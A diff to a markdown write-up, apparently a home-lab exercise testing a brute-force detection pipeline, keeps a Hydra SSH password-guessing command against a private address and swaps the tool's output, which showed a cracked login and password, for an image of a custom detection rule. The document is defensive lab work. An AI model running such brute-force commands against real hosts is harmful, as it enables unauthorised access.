@@ -270,16 +270,7 @@ trigger the entire pipeline under real conditions — not a manual test run.
 hydra -L users.txt -P password.txt ssh://192.168.8.127
 ```
 
-```
-Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-14 06:13:03
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:1/p:14), ~1 try per task
-[DATA] attacking ssh://192.168.8.127:22/
-[22][ssh] host: 192.168.8.127   login: ansible   password: ahmed
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-14 06:13:18
-```
+![Custom brute-force rule XML](images/4.png)
 
 Two things are worth noting about this run:
 
